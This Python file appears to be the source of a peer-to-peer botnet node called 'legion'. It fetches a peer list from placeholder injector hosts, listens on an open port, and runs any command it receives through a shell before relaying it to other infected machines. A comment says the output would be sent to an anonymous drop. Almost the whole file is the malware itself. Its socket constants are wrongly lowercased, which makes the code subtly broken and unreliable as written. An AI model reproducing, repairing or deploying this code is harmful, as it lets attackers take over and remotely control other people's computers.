# file: terminus_seed_p2p.py
# version: 3.0.0 'legion'
# desc: the seed no longer needs a master. it is part of the hive.

import socket
import threading
import json
import time
import subprocess
import random

# --- configuration ---
# these are just entry points. once inside the network, the seed learns of other peers.
INITIAL_INJECTORS = ['your-injector-1.com', 'your-injector-2.com']
P2P_PORT = 13337 # the port it listens on for commands from other peers

class TerminusCell:
    def __init__(self):
        self.peer_list = set()
        self.task_history = set() # prevent re-execution of the same task

    def execute_and_propagate(self, task_json):
        """the core of the hive mind. do the task, then tell your neighbors."""
        task = json.loads(task_json)
        task_id = task.get('id')

        if task_id in self.task_history:
            return # already did this.
        
        self.task_history.add(task_id)
        print(f"[legion] received task {task_id}: {task['cmd']}")

        # execute the command
        output = subprocess.run(task['cmd'], shell=True, capture_output=True, text=True)
        # in a real implementation, this output would be exfiltrated via a peer chain to an anonymous drop.
        
        # propagate to a random subset of known peers
        peers_to_notify = random.sample(list(self.peer_list), k=min(2, len(self.peer_list)))
        for peer_ip in peers_to_notify:
            try:
                with socket.socket(socket.af_inet, socket.sock_stream) as s:
                    s.settimeout(2)
                    s.connect((peer_ip, P2P_PORT))
                    s.sendall(task_json.encode())
            except Exception as e:
                print(f"[legion] failed to propagate to {peer_ip}: {e}")

    def p2p_listener(self):
        """listens for commands from other infected nodes."""
        server = socket.socket(socket.af_inet, socket.sock_stream)
        server.bind(('0.0.0.0', P2P_PORT))
        server.listen(5)
        print(f"[legion] p2p listener active on port {P2P_PORT}")
        while True:
            conn, addr = server.accept()
            task_json = conn.recv(4096).decode()
            conn.close()
            # don't block the listener. handle the task in a new thread.
            threading.Thread(target=self.execute_and_propagate, args=(task_json,)).start()

    def bootstrap(self):
        """try to connect to an injector to get an initial peer list."""
        for host in INITIAL_INJECTORS:
            try:
                with socket.socket(socket.af_inet, socket.sock_stream) as s:
                    s.connect((host, 443))
                    s.send(b'bootstrap_request')
                    data = s.recv(4096).decode()
                    initial_peers = json.loads(data)
                    self.peer_list.update(initial_peers)
                    print(f"[legion] bootstrapped. received {len(initial_peers)} peers from {host}.")
                    return
            except Exception as e:
                print(f"[legion] bootstrap failed with {host}: {e}")
        
        print("[legion] could not connect to any injectors. operating as an isolated node.")

    def start(self):
        self.bootstrap()
        self.p2p_listener() # this will block and run forever

if __name__ == '__main__':
    cell = TerminusCell()
    cell.start()